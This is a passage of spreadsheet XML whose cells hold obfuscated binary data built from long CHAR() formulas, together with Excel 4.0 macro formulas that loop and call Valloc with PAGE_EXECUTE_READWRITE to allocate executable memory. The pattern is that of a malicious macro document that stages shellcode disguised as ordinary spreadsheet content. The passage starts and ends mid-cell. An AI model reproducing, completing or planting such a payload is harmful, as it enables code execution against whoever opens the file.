AR(21)&amp;CHAR(88)&amp;CHAR(15)&amp;CHAR(192)&amp;CHAR(8)&amp;CHAR(153)&amp;CHAR(43)&amp;CHAR(36)&amp;CHAR(254)&amp;CHAR(243)&amp;CHAR(13)&amp;CHAR(34)&amp;CHAR(84)&amp;CHAR(19)&amp;CHAR(72)&amp;CHAR(195)&amp;CHAR(120)&amp;CHAR(161)&amp;CHAR(156)&amp;CHAR(201)</f>
        <v>¡õ¸¤CªY*JñJ€©*õ_x0001__x001D_¯0e‹~Ñ¸H_x0016_ÔPàÂýüÛí_x000F_Ý_x0006_ù8ïƒø‰W:Ç:¦¯Y_x001D_¡µÁ·_x001F_¾íØMŠ—v3Zå[ÇõukæøªJY“©dŠxƒÐšÁÂl þ-£_x001A_õ$_x001B_Ð_ý²ñU[¹Š_x001B_œÏMôZ.žYŠJ_x000B_ƒPssbÆïö2NlÊ˜Ía„4ŒQá«_x0002_ÖÃYò[/®_x001F_­}ì »Ói#[é!&gt;_x0015_$ù\‹œ&lt;_x001C_[Ä_x0003_zi €Ž"ó$†¸Vì×
a_x0003_ÇDU_x0014_ÙÙã_/3^ˆÃ Q‹_x0002__x000F__x000F_øÿ_x0005_g_x0010_r_x0003_¨M–¯1j‘ªi_x001F__x000E_•‡ßÓC&gt;&lt;_x0015_X_x000F_À_x0008_™+$þó_x000D_"T_x0013_HÃx¡œÉ</v>
      </c>
      <c r="C21" t="str">
        <f>CHAR(182)&amp;CHAR(114)&amp;CHAR(241)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(222)&amp;CHAR(185)&amp;CHAR(239)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>¶rñýôÞ¹ï»ë</v>
      </c>
    </row>
    <row r="22" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A22">
        <v>0</v>
      </c>
      <c r="B22" t="str">
        <f>CHAR(74)&amp;CHAR(181)&amp;CHAR(13)&amp;CHAR(18)&amp;CHAR(100)&amp;CHAR(249)&amp;CHAR(165)&amp;CHAR(190)&amp;CHAR(2)&amp;CHAR(207)&amp;CHAR(154)&amp;CHAR(57)&amp;CHAR(102)&amp;CHAR(141)&amp;CHAR(175)&amp;CHAR(46)&amp;CHAR(249)&amp;CHAR(179)&amp;CHAR(15)&amp;CHAR(151)&amp;CHAR(34)&amp;CHAR(99)&amp;CHAR(6)&amp;CHAR(24)&amp;CHAR(205)&amp;CHAR(4)&amp;CHAR(75)&amp;CHAR(207)&amp;CHAR(89)&amp;CHAR(48)&amp;CHAR(140)&amp;CHAR(134)&amp;CHAR(112)&amp;CHAR(197)&amp;CHAR(35)&amp;CHAR(47)&amp;CHAR(178)&amp;CHAR(204)&amp;CHAR(14)&amp;CHAR(231)&amp;CHAR(219)&amp;CHAR(84)&amp;CHAR(233)&amp;CHAR(87)&amp;CHAR(87)&amp;CHAR(85)&amp;CHAR(186)&amp;CHAR(112)&amp;CHAR(211)&amp;CHAR(50)&amp;CHAR(85)&amp;CHAR(169)&amp;CHAR(85)&amp;CHAR(218)&amp;CHAR(186)&amp;CHAR(55)&amp;CHAR(27)&amp;CHAR(49)&amp;CHAR(151)&amp;CHAR(213)&amp;CHAR(28)&amp;CHAR(52)&amp;CHAR(64)&amp;CHAR(204)&amp;CHAR(45)&amp;CHAR(228)&amp;CHAR(181)&amp;CHAR(229)&amp;CHAR(6)&amp;CHAR(240)&amp;CHAR(48)&amp;CHAR(186)&amp;CHAR(61)&amp;CHAR(22)&amp;CHAR(200)&amp;CHAR(201)&amp;CHAR(80)&amp;CHAR(157)&amp;CHAR(17)&amp;CHAR(223)&amp;CHAR(68)&amp;CHAR(56)&amp;CHAR(171)&amp;CHAR(83)&amp;CHAR(148)&amp;CHAR(230)&amp;CHAR(144)&amp;CHAR(234)&amp;CHAR(32)&amp;CHAR(100)&amp;CHAR(203)&amp;CHAR(242)&amp;CHAR(127)&amp;CHAR(195)&amp;CHAR(84)&amp;CHAR(8)&amp;CHAR(180)&amp;CHAR(191)&amp;CHAR(33)&amp;CHAR(243)&amp;CHAR(255)&amp;CHAR(42)&amp;CHAR(16)&amp;CHAR(179)&amp;CHAR(225)&amp;CHAR(167)&amp;CHAR(122)&amp;CHAR(155)&amp;CHAR(174)&amp;CHAR(182)&amp;CHAR(146)&amp;CHAR(192)&amp;CHAR(179)&amp;CHAR(198)&amp;CHAR(189)&amp;CHAR(165)&amp;CHAR(102)&amp;CHAR(242)&amp;CHAR(188)&amp;CHAR(212)&amp;CHAR(252)&amp;CHAR(37)&amp;CHAR(4)&amp;CHAR(149)&amp;CHAR(69)&amp;CHAR(139)&amp;CHAR(173)&amp;CHAR(72)&amp;CHAR(252)&amp;CHAR(85)&amp;CHAR(229)&amp;CHAR(3)&amp;CHAR(33)&amp;CHAR(255)&amp;CHAR(117)&amp;CHAR(78)&amp;CHAR(48)&amp;CHAR(197)&amp;CHAR(39)&amp;CHAR(123)&amp;CHAR(20)&amp;CHAR(78)&amp;CHAR(144)&amp;CHAR(73)&amp;CHAR(243)&amp;CHAR(129)&amp;CHAR(1)&amp;CHAR(94)&amp;CHAR(124)&amp;CHAR(21)&amp;CHAR(65)&amp;CHAR(112)&amp;CHAR(157)&amp;CHAR(156)&amp;CHAR(207)&amp;CHAR(45)&amp;CHAR(246)&amp;CHAR(63)&amp;CHAR(233)&amp;CHAR(237)&amp;CHAR(100)&amp;CHAR(40)&amp;CHAR(4)&amp;CHAR(13)&amp;CHAR(27)&amp;CHAR(220)&amp;CHAR(119)&amp;CHAR(23)&amp;CHAR(93)&amp;CHAR(50)&amp;CHAR(172)&amp;CHAR(208)&amp;CHAR(71)&amp;CHAR(128)&amp;CHAR(22)&amp;CHAR(21)&amp;CHAR(231)&amp;CHAR(34)&amp;CHAR(171)&amp;CHAR(103)&amp;CHAR(103)&amp;CHAR(222)&amp;CHAR(133)&amp;CHAR(95)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(186)&amp;CHAR(135)&amp;CHAR(140)&amp;CHAR(245)&amp;CHAR(194)&amp;CHAR(89)&amp;CHAR(90)&amp;CHAR(42)&amp;CHAR(82)&amp;CHAR(18)&amp;CHAR(182)&amp;CHAR(118)&amp;CHAR(22)&amp;CHAR(219)&amp;CHAR(88)&amp;CHAR(148)&amp;CHAR(182)&amp;CHAR(222)&amp;CHAR(77)&amp;CHAR(29)&amp;CHAR(234)&amp;CHAR(230)&amp;CHAR(183)&amp;CHAR(221)&amp;CHAR(201)&amp;CHAR(244)&amp;CHAR(68)&amp;CHAR(4)&amp;CHAR(197)&amp;CHAR(27)&amp;CHAR(254)&amp;CHAR(130)&amp;CHAR(246)&amp;CHAR(65)&amp;CHAR(42)&amp;CHAR(55)&amp;CHAR(49)&amp;CHAR(124)&amp;CHAR(6)&amp;CHAR(85)&amp;CHAR(37)&amp;CHAR(62)&amp;CHAR(166)&amp;CHAR(116)&amp;CHAR(75)&amp;CHAR(239)&amp;CHAR(16)&amp;CHAR(79)&amp;CHAR(32)&amp;CHAR(123)&amp;CHAR(76)&amp;CHAR(103)&amp;CHAR(41)&amp;CHAR(112)&amp;CHAR(110)&amp;CHAR(188)&amp;CHAR(107)&amp;CHAR(150)&amp;CHAR(124)&amp;CHAR(64)&amp;CHAR(149)&amp;CHAR(176)&amp;CHAR(37)&amp;CHAR(205)&amp;CHAR(149)&amp;CHAR(89)&amp;CHAR(122)&amp;CHAR(66)&amp;CHAR(72)</f>
        <v>Jµ_x000D__x0012_dù¥¾_x0002_Ïš9f¯.ù³_x000F_—"c_x0006__x0018_Í_x0004_KÏY0Œ†pÅ#/²Ì_x000E_çÛTéWWUºpÓ2U©UÚº7_x001B_1—Õ_x001C_4@Ì-äµå_x0006_ð0º=_x0016_ÈÉP_x0011_ßD8«S”æê dËòÃT_x0008_´¿!óÿ*_x0010_³á§z›®¶’À³Æ½¥fò¼Ôü%_x0004_•E‹­HüUå_x0003_!ÿuN0Å'{_x0014_NIó_x0001_^|_x0015_ApœÏ-ö?éíd(_x0004__x000D__x001B_Üw_x0017_]2¬ÐG€_x0016__x0015_ç"«ggÞ…__x0005__x0006_º‡ŒõÂYZ*R_x0012_¶v_x0016_ÛX”¶ÞM_x001D_êæ·ÝÉôD_x0004_Å_x001B_þ‚öA*71|_x0006_U%&gt;¦tKï_x0010_O {Lg)pn¼k–|@•°%Í•YzBH</v>
      </c>
      <c r="C22" t="str">
        <f>CHAR(191)&amp;CHAR(112)&amp;CHAR(249)&amp;CHAR(157)&amp;CHAR(203)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(142)&amp;CHAR(191)&amp;CHAR(118)</f>
        <v>¿pùËë»Ž¿v</v>
      </c>
    </row>
    <row r="23" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A23" t="b">
        <f>WHILE(A21=0)</f>
        <v>0</v>
      </c>
      <c r="B23" t="str">
        <f>CHAR(191)&amp;CHAR(32)&amp;CHAR(184)&amp;CHAR(139)&amp;CHAR(91)&amp;CHAR(189)&amp;CHAR(169)&amp;CHAR(2)&amp;CHAR(148)&amp;CHAR(77)&amp;CHAR(112)&amp;CHAR(248)&amp;CHAR(49)&amp;CHAR(68)&amp;CHAR(133)&amp;CHAR(104)&amp;CHAR(194)&amp;CHAR(221)&amp;CHAR(255)&amp;CHAR(195)&amp;CHAR(166)&amp;CHAR(19)&amp;CHAR(152)&amp;CHAR(37)&amp;CHAR(88)&amp;CHAR(85)&amp;CHAR(163)&amp;CHAR(229)&amp;CHAR(236)&amp;CHAR(205)&amp;CHAR(45)&amp;CHAR(96)&amp;CHAR(9)&amp;CHAR(147)&amp;CHAR(48)&amp;CHAR(220)&amp;CHAR(230)&amp;CHAR(48)&amp;CHAR(87)&amp;CHAR(160)&amp;CHAR(152)&amp;CHAR(80)&amp;CHAR(73)&amp;CHAR(3)&amp;CHAR(109)&amp;CHAR(64)&amp;CHAR(86)&amp;CHAR(38)&amp;CHAR(146)&amp;CHAR(39)&amp;CHAR(190)&amp;CHAR(133)&amp;CHAR(50)&amp;CHAR(90)&amp;CHAR(192)&amp;CHAR(149)&amp;CHAR(47)&amp;CHAR(95)&amp;CHAR(142)&amp;CHAR(151)&amp;CHAR(30)&amp;CHAR(27)&amp;CHAR(80)&amp;CHAR(242)&amp;CHAR(6)&amp;CHAR(140)&amp;CHAR(101)&amp;CHAR(18)&amp;CHAR(23)&amp;CHAR(75)&amp;CHAR(77)&amp;CHAR(40)&amp;CHAR(64)&amp;CHAR(124)&amp;CHAR(88)&amp;CHAR(254)&amp;CHAR(160)&amp;CHAR(215)&amp;CHAR(102)&amp;CHAR(156)&amp;CHAR(39)&amp;CHAR(3)&amp;CHAR(2)&amp;CHAR(226)&amp;CHAR(50)&amp;CHAR(47)&amp;CHAR(89)&amp;CHAR(179)&amp;CHAR(234)&amp;CHAR(189)&amp;CHAR(217)&amp;CHAR(225)&amp;CHAR(34)&amp;CHAR(205)&amp;CHAR(169)&amp;CHAR(151)&amp;CHAR(32)&amp;CHAR(197)&amp;CHAR(217)&amp;CHAR(205)&amp;CHAR(46)&amp;CHAR(50)&amp;CHAR(95)&amp;CHAR(129)&amp;CHAR(68)&amp;CHAR(108)&amp;CHAR(26)&amp;CHAR(244)&amp;CHAR(167)&amp;CHAR(57)&amp;CHAR(13)&amp;CHAR(144)&amp;CHAR(72)&amp;CHAR(104)&amp;CHAR(245)&amp;CHAR(52)&amp;CHAR(233)&amp;CHAR(117)&amp;CHAR(164)&amp;CHAR(48)&amp;CHAR(228)&amp;CHAR(20)&amp;CHAR(44)&amp;CHAR(113)&amp;CHAR(14)&amp;CHAR(237)&amp;CHAR(23)&amp;CHAR(221)&amp;CHAR(29)&amp;CHAR(48)&amp;CHAR(236)&amp;CHAR(78)&amp;CHAR(53)&amp;CHAR(7)&amp;CHAR(75)&amp;CHAR(122)&amp;CHAR(245)&amp;CHAR(25)&amp;CHAR(224)&amp;CHAR(11)&amp;CHAR(43)&amp;CHAR(138)&amp;CHAR(193)&amp;CHAR(44)&amp;CHAR(96)&amp;CHAR(69)&amp;CHAR(234)&amp;CHAR(164)&amp;CHAR(78)&amp;CHAR(245)&amp;CHAR(2)&amp;CHAR(157)&amp;CHAR(112)&amp;CHAR(250)&amp;CHAR(211)&amp;CHAR(133)&amp;CHAR(229)&amp;CHAR(78)&amp;CHAR(251)&amp;CHAR(59)&amp;CHAR(31)&amp;CHAR(170)&amp;CHAR(26)&amp;CHAR(208)&amp;CHAR(118)&amp;CHAR(168)&amp;CHAR(42)&amp;CHAR(184)&amp;CHAR(247)&amp;CHAR(140)&amp;CHAR(59)&amp;CHAR(128)&amp;CHAR(149)&amp;CHAR(37)&amp;CHAR(94)&amp;CHAR(235)&amp;CHAR(98)&amp;CHAR(6)&amp;CHAR(198)&amp;CHAR(79)&amp;CHAR(199)&amp;CHAR(136)&amp;CHAR(79)&amp;CHAR(24)&amp;CHAR(226)&amp;CHAR(113)&amp;CHAR(5)&amp;CHAR(63)&amp;CHAR(133)&amp;CHAR(28)&amp;CHAR(25)&amp;CHAR(154)&amp;CHAR(28)&amp;CHAR(16)&amp;CHAR(70)&amp;CHAR(110)&amp;CHAR(188)&amp;CHAR(9)&amp;CHAR(175)&amp;CHAR(56)&amp;CHAR(4)&amp;CHAR(46)&amp;CHAR(40)&amp;CHAR(122)&amp;CHAR(193)&amp;CHAR(130)&amp;CHAR(192)&amp;CHAR(200)&amp;CHAR(12)&amp;CHAR(152)&amp;CHAR(160)&amp;CHAR(204)&amp;CHAR(254)&amp;CHAR(186)&amp;CHAR(228)&amp;CHAR(53)&amp;CHAR(207)&amp;CHAR(20)&amp;CHAR(186)&amp;CHAR(195)&amp;CHAR(161)&amp;CHAR(102)&amp;CHAR(225)&amp;CHAR(22)&amp;CHAR(213)&amp;CHAR(111)&amp;CHAR(179)&amp;CHAR(30)&amp;CHAR(216)&amp;CHAR(237)&amp;CHAR(151)&amp;CHAR(9)&amp;CHAR(250)&amp;CHAR(243)&amp;CHAR(32)&amp;CHAR(158)&amp;CHAR(221)&amp;CHAR(93)&amp;CHAR(202)&amp;CHAR(250)&amp;CHAR(62)&amp;CHAR(148)&amp;CHAR(114)&amp;CHAR(86)&amp;CHAR(99)&amp;CHAR(137)&amp;CHAR(197)&amp;CHAR(126)&amp;CHAR(217)&amp;CHAR(242)&amp;CHAR(29)&amp;CHAR(63)&amp;CHAR(153)&amp;CHAR(115)&amp;CHAR(94)</f>
        <v>¿ ¸‹[½©_x0002_”Mpø1D…hÂÝÿÃ¦_x0013_˜%XU£åìÍ-`	“0Üæ0W ˜PI_x0003_m@V&amp;’'¾…2ZÀ•/_Ž—_x001E__x001B_Pò_x0006_Œe_x0012__x0017_KM(@|Xþ ×fœ'_x0003__x0002_â2/Y³ê½Ùá"Í©— ÅÙÍ.2_Dl_x001A_ô§9_x000D_Hhõ4éu¤0ä_x0014_,q_x000E_í_x0017_Ý_x001D_0ìN5_x0007_Kzõ_x0019_à_x000B_+ŠÁ,`Eê¤Nõ_x0002_púÓ…åNû;_x001F_ª_x001A_Ðv¨*¸÷Œ;€•%^ëb_x0006_ÆOÇˆO_x0018_âq_x0005_?…_x001C__x0019_š_x001C__x0010_Fn¼	¯8_x0004_.(zÁ‚ÀÈ_x000C_˜ Ìþºä5Ï_x0014_ºÃ¡fá_x0016_Õo³_x001E_Øí—	úó žÝ]Êú&gt;”rVc‰Å~Ùò_x001D_?™s^</v>
      </c>
      <c r="C23" t="str">
        <f>CHAR(192)&amp;CHAR(19)&amp;CHAR(229)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(8)&amp;CHAR(171)&amp;CHAR(236)&amp;CHAR(83)</f>
        <v>À_x0013_åë»ë_x0008_«ìS</v>
      </c>
    </row>
    <row r="24" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A24" t="b">
        <f>SET.VALUE(A21,Valloc(A20,65536,12288,64))</f>
        <v>0</v>
      </c>
      <c r="B24" t="str">
        <f>CHAR(246)&amp;CHAR(141)&amp;CHAR(242)&amp;CHAR(104)&amp;CHAR(238)&amp;CHAR(90)&amp;CHAR(159)&amp;CHAR(150)&amp;CHAR(189)&amp;CHAR(51)&amp;CHAR(129)&amp;CHAR(13)&amp;CHAR(121)&amp;CHAR(80)&amp;CHAR(220)&amp;CHAR(249)&amp;CHAR(51)&amp;CHAR(84)&amp;CHAR(34)&amp;CHAR(251)&amp;CHAR(97)&amp;CHAR(76)&amp;CHAR(214)&amp;CHAR(27)&amp;CHAR(247)&amp;CHAR(67)&amp;CHAR(74)&amp;CHAR(203)&amp;CHAR(116)&amp;CHAR(156)&amp;CHAR(106)&amp;CHAR(255)&amp;CHAR(7)&amp;CHAR(48)&amp;CHAR(88)&amp;CHAR(2)&amp;CHAR(170)&amp;CHAR(52)&amp;CHAR(121)&amp;CHAR(186)&amp;CHAR(120)&amp;CHAR(28)&amp;CHAR(205)&amp;CHAR(213)&amp;CHAR(161)&amp;CHAR(21)&amp;CHAR(113)&amp;CHAR(146)&amp;CHAR(123)&amp;CHAR(139)&amp;CHAR(138)&amp;CHAR(227)&amp;CHAR(56)&amp;CHAR(163)&amp;CHAR(226)&amp;CHAR(115)&amp;CHAR(31)&amp;CHAR(9)&amp;CHAR(27)&amp;CHAR(8)&amp;CHAR(104)&amp;CHAR(151)&amp;CHAR(112)&amp;CHAR(227)&amp;CHAR(136)&amp;CHAR(43)&amp;CHAR(192)&amp;CHAR(250)&amp;CHAR(76)&amp;CHAR(230)&amp;CHAR(178)&amp;CHAR(11)&amp;CHAR(32)&amp;CHAR(84)&amp;CHAR(153)&amp;CHAR(102)&amp;CHAR(65)&amp;CHAR(70)&amp;CHAR(151)&amp;CHAR(135)&amp;CHAR(97)&amp;CHAR(202)&amp;CHAR(179)&amp;CHAR(216)&amp;CHAR(154)&amp;CHAR(42)&amp;CHAR(93)&amp;CHAR(51)&amp;CHAR(81)&amp;CHAR(254)&amp;CHAR(157)&amp;CHAR(36)&amp;CHAR(42)&amp;CHAR(63)&amp;CHAR(118)&amp;CHAR(32)&amp;CHAR(174)&amp;CHAR(88)&amp;CHAR(39)&amp;CHAR(203)&amp;CHAR(37)&amp;CHAR(39)&amp;CHAR(76)&amp;CHAR(48)&amp;CHAR(159)&amp;CHAR(137)&amp;CHAR(232)&amp;CHAR(247)&amp;CHAR(233)&amp;CHAR(197)&amp;CHAR(225)&amp;CHAR(59)&amp;CHAR(112)&amp;CHAR(85)&amp;CHAR(208)&amp;CHAR(25)&amp;CHAR(214)&amp;CHAR(78)&amp;CHAR(140)&amp;CHAR(7)&amp;CHAR(145)&amp;CHAR(44)&amp;CHAR(190)&amp;CHAR(217)&amp;CHAR(77)&amp;CHAR(85)&amp;CHAR(106)&amp;CHAR(162)&amp;CHAR(254)&amp;CHAR(156)&amp;CHAR(208)&amp;CHAR(187)&amp;CHAR(27)&amp;CHAR(52)&amp;CHAR(162)&amp;CHAR(214)&amp;CHAR(3)&amp;CHAR(135)&amp;CHAR(40)&amp;CHAR(135)&amp;CHAR(135)&amp;CHAR(186)&amp;CHAR(210)&amp;CHAR(77)&amp;CHAR(101)&amp;CHAR(121)&amp;CHAR(208)&amp;CHAR(75)&amp;CHAR(43)&amp;CHAR(170)&amp;CHAR(168)&amp;CHAR(247)&amp;CHAR(66)&amp;CHAR(149)&amp;CHAR(168)&amp;CHAR(29)&amp;CHAR(83)&amp;CHAR(75)&amp;CHAR(110)&amp;CHAR(243)&amp;CHAR(42)&amp;CHAR(147)&amp;CHAR(6)&amp;CHAR(44)&amp;CHAR(58)&amp;CHAR(8)&amp;CHAR(217)&amp;CHAR(58)&amp;CHAR(114)&amp;CHAR(189)&amp;CHAR(2)&amp;CHAR(144)&amp;CHAR(144)&amp;CHAR(183)&amp;CHAR(160)&amp;CHAR(113)&amp;CHAR(96)&amp;CHAR(115)&amp;CHAR(114)&amp;CHAR(142)&amp;CHAR(10)&amp;CHAR(240)&amp;CHAR(91)&amp;CHAR(48)&amp;CHAR(170)&amp;CHAR(242)&amp;CHAR(143)&amp;CHAR(179)&amp;CHAR(243)&amp;CHAR(154)&amp;CHAR(75)&amp;CHAR(70)&amp;CHAR(246)&amp;CHAR(179)&amp;CHAR(136)&amp;CHAR(11)&amp;CHAR(81)&amp;CHAR(227)&amp;CHAR(214)&amp;CHAR(178)&amp;CHAR(90)&amp;CHAR(205)&amp;CHAR(68)&amp;CHAR(27)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(192)&amp;CHAR(157)&amp;CHAR(232)&amp;CHAR(126)&amp;CHAR(177)&amp;CHAR(108)&amp;CHAR(110)&amp;CHAR(110)&amp;CHAR(234)&amp;CHAR(244)&amp;CHAR(164)&amp;CHAR(202)&amp;CHAR(149)&amp;CHAR(171)&amp;CHAR(94)&amp;CHAR(128)&amp;CHAR(139)&amp;CHAR(7)&amp;CHAR(73)&amp;CHAR(9)&amp;CHAR(152)&amp;CHAR(139)&amp;CHAR(205)&amp;CHAR(43)&amp;CHAR(121)&amp;CHAR(92)&amp;CHAR(5)&amp;CHAR(130)&amp;CHAR(155)&amp;CHAR(197)&amp;CHAR(188)&amp;CHAR(122)&amp;CHAR(83)&amp;CHAR(168)&amp;CHAR(192)&amp;CHAR(41)&amp;CHAR(169)&amp;CHAR(201)&amp;CHAR(72)&amp;CHAR(5)&amp;CHAR(108)&amp;CHAR(17)&amp;CHAR(179)&amp;CHAR(32)&amp;CHAR(9)&amp;CHAR(94)&amp;CHAR(117)&amp;CHAR(140)&amp;CHAR(9)</f>
        <v xml:space="preserve">öòhîZŸ–½3_x000D_yPÜù3T"ûaLÖ_x001B_÷CJËtœjÿ_x0007_0X_x0002_ª4yºx_x001C_ÍÕ¡_x0015_q’{‹Šã8£âs_x001F_	_x001B__x0008_h—pãˆ+ÀúLæ²_x000B_ T™fAF—‡aÊ³Øš*]3Qþ$*?v ®X'Ë%'L0Ÿ‰è÷éÅá;pUÐ_x0019_ÖNŒ_x0007_‘,¾ÙMUj¢þœÐ»_x001B_4¢Ö_x0003_‡(‡‡ºÒMeyÐK+ª¨÷B•¨_x001D_SKnó*“_x0006_,:_x0008_Ù:r½_x0002_· q`srŽ
ð[0ªò³óšKFö³ˆ_x000B_QãÖ²ZÍD_x001B_qzÀè~±lnnêô¤Ê•«^€‹_x0007_I	˜‹Í+y\_x0005_‚›Å¼zS¨À)©ÉH_x0005_l_x0011_³ 	^uŒ	</v>
      </c>
      <c r="C24" t="str">
        <f>CHAR(133)&amp;CHAR(96)&amp;CHAR(143)&amp;CHAR(206)&amp;CHAR(223)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(133)&amp;CHAR(104)</f>
        <v>…`Îßýô6…h</v>
      </c>
    </row>
    <row r="25" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A25" t="b">
        <f>SET.VALUE(A20,A20+262144)</f>
        <v>0</v>
      </c>
      <c r="B25" t="str">
        <f>CHAR(205)&amp;CHAR(159)&amp;CHAR(68)&amp;CHAR(236)&amp;CHAR(217)&amp;CHAR(148)&amp;CHAR(176)&amp;CHAR(69)&amp;CHAR(36)&amp;CHAR(21)&amp;CHAR(175)&amp;CHAR(109)&amp;CHAR(253)&amp;CHAR(119)&amp;CHAR(127)&amp;CHAR(187)&amp;CHAR(77)&amp;CHAR(159)&amp;CHAR(147)&amp;CHAR(89)&amp;CHAR(184)&amp;CHAR(147)&amp;CHAR(130)&amp;CHAR(33)&amp;CHAR(204)&amp;CHAR(232)&amp;CHAR(205)&amp;CHAR(33)&amp;CHAR(158)&amp;CHAR(230)&amp;CHAR(220)&amp;CHAR(177)&amp;CHAR(5)&amp;CHAR(184)&amp;CHAR(211)&amp;CHAR(139)&amp;CHAR(17)&amp;CHAR(130)&amp;CHAR(139)&amp;CHAR(4)&amp;CHAR(207)&amp;CHAR(91)&amp;CHAR(199)&amp;CHAR(233)&amp;CHAR(222)&amp;CHAR(231)&amp;CHAR(99)&amp;CHAR(144)&amp;CHAR(53)&amp;CHAR(83)&amp;CHAR(38)&amp;CHAR(131)&amp;CHAR(59)&amp;CHAR(240)&amp;CHAR(122)&amp;CHAR(73)&amp;CHAR(35)&amp;CHAR(149)&amp;CHAR(35)&amp;CHAR(222)&amp;CHAR(100)&amp;CHAR(157)&amp;CHAR(84)&amp;CHAR(77)&amp;CHAR(46)&amp;CHAR(101)&amp;CHAR(95)&amp;CHAR(35)&amp;CHAR(16)&amp;CHAR(49)&amp;CHAR(12)&amp;CHAR(15)&amp;CHAR(29)&amp;CHAR(194)&amp;CHAR(184)&amp;CHAR(37)&amp;CHAR(148)&amp;CHAR(26)&amp;CHAR(41)&amp;CHAR(107)&amp;CHAR(171)&amp;CHAR(9)&amp;CHAR(139)&amp;CHAR(183)&amp;CHAR(241)&amp;CHAR(31)&amp;CHAR(163)&amp;CHAR(61)&amp;CHAR(12)&amp;CHAR(132)&amp;CHAR(187)&amp;CHAR(209)&amp;CHAR(239)&amp;CHAR(142)&amp;CHAR(198)&amp;CHAR(99)&amp;CHAR(20)&amp;CHAR(102)&amp;CHAR(82)&amp;CHAR(51)&amp;CHAR(39)&amp;CHAR(33)&amp;CHAR(67)&amp;CHAR(250)&amp;CHAR(74)&amp;CHAR(178)&amp;CHAR(15)&amp;CHAR(104)&amp;CHAR(141)&amp;CHAR(250)&amp;CHAR(138)&amp;CHAR(139)&amp;CHAR(37)&amp;CHAR(182)&amp;CHAR(77)&amp;CHAR(87)&amp;CHAR(144)&amp;CHAR(101)&amp;CHAR(78)&amp;CHAR(84)&amp;CHAR(133)&amp;CHAR(124)&amp;CHAR(126)&amp;CHAR(255)&amp;CHAR(61)&amp;CHAR(198)&amp;CHAR(148)&amp;CHAR(161)&amp;CHAR(91)&amp;CHAR(221)&amp;CHAR(248)&amp;CHAR(238)&amp;CHAR(110)&amp;CHAR(224)&amp;CHAR(120)&amp;CHAR(229)&amp;CHAR(57)&amp;CHAR(156)&amp;CHAR(6)&amp;CHAR(206)&amp;CHAR(119)&amp;CHAR(76)&amp;CHAR(72)&amp;CHAR(229)&amp;CHAR(64)&amp;CHAR(111)&amp;CHAR(113)&amp;CHAR(31)&amp;CHAR(238)&amp;CHAR(125)&amp;CHAR(166)&amp;CHAR(61)&amp;CHAR(74)&amp;CHAR(166)&amp;CHAR(32)&amp;CHAR(117)&amp;CHAR(31)&amp;CHAR(223)&amp;CHAR(7)&amp;CHAR(146)&amp;CHAR(58)&amp;CHAR(12)&amp;CHAR(217)&amp;CHAR(27)&amp;CHAR(203)&amp;CHAR(108)&amp;CHAR(151)&amp;CHAR(220)&amp;CHAR(27)&amp;CHAR(50)&amp;CHAR(151)&amp;CHAR(106)&amp;CHAR(120)&amp;CHAR(225)&amp;CHAR(159)&amp;CHAR(185)&amp;CHAR(114)&amp;CHAR(164)&amp;CHAR(45)&amp;CHAR(78)&amp;CHAR(91)&amp;CHAR(1)&amp;CHAR(70)&amp;CHAR(122)&amp;CHAR(74)&amp;CHAR(177)&amp;CHAR(154)&amp;CHAR(252)&amp;CHAR(120)&amp;CHAR(224)&amp;CHAR(17)&amp;CHAR(248)&amp;CHAR(105)&amp;CHAR(95)&amp;CHAR(13)&amp;CHAR(157)&amp;CHAR(210)&amp;CHAR(11)&amp;CHAR(151)&amp;CHAR(158)&amp;CHAR(40)&amp;CHAR(142)&amp;CHAR(112)&amp;CHAR(33)&amp;CHAR(238)&amp;CHAR(31)&amp;CHAR(44)&amp;CHAR(140)&amp;CHAR(30)&amp;CHAR(84)&amp;CHAR(210)&amp;CHAR(126)&amp;CHAR(30)&amp;CHAR(39)&amp;CHAR(203)&amp;CHAR(196)&amp;CHAR(200)&amp;CHAR(12)&amp;CHAR(240)&amp;CHAR(25)&amp;CHAR(181)&amp;CHAR(70)&amp;CHAR(227)&amp;CHAR(252)&amp;CHAR(125)&amp;CHAR(174)&amp;CHAR(208)&amp;CHAR(147)&amp;CHAR(184)&amp;CHAR(154)&amp;CHAR(184)&amp;CHAR(18)&amp;CHAR(123)&amp;CHAR(254)&amp;CHAR(45)&amp;CHAR(4)&amp;CHAR(126)&amp;CHAR(15)&amp;CHAR(6)&amp;CHAR(52)&amp;CHAR(43)&amp;CHAR(84)&amp;CHAR(107)&amp;CHAR(135)&amp;CHAR(203)&amp;CHAR(81)&amp;CHAR(139)&amp;CHAR(173)&amp;CHAR(245)&amp;CHAR(27)&amp;CHAR(172)&amp;CHAR(227)&amp;CHAR(12)&amp;CHAR(16)&amp;CHAR(8)</f>
        <v>ÍŸDìÙ”°E$_x0015_¯mýw»MŸ“Y¸“‚!ÌèÍ!žæÜ±_x0005_¸Ó‹_x0011_‚‹_x0004_Ï[ÇéÞçc5S&amp;ƒ;ðzI#•#ÞdTM.e_#_x0010_1_x000C__x000F__x001D_Â¸%”_x001A_)k«	‹·ñ_x001F_£=_x000C_„»ÑïŽÆc_x0014_fR3'!CúJ²_x000F_húŠ‹%¶MWeNT…|~ÿ=Æ”¡[Ýøînàxå9œ_x0006_ÎwLHå@oq_x001F_î}¦=J¦ u_x001F_ß_x0007_’:_x000C_Ù_x001B_Ël—Ü_x001B_2—jxáŸ¹r¤-N[_x0001_FzJ±šüxà_x0011_øi__x000D_Ò_x000B_—ž(Žp!î_x001F_,Œ_x001E_TÒ~_x001E_'ËÄÈ_x000C_ð_x0019_µFãü}®Ð“¸š¸_x0012_{þ-_x0004_~_x000F__x0006_4+Tk‡ËQ‹­õ_x001B_¬ã_x000C__x0010__x0008_</v>
      </c>
      <c r="C25" t="str">
        <f>CHAR(125)&amp;CHAR(195)&amp;CHAR(190)&amp;CHAR(116)&amp;CHAR(4)&amp;CHAR(126)&amp;CHAR(64)&amp;CHAR(254)&amp;CHAR(46)&amp;CHAR(237)</f>
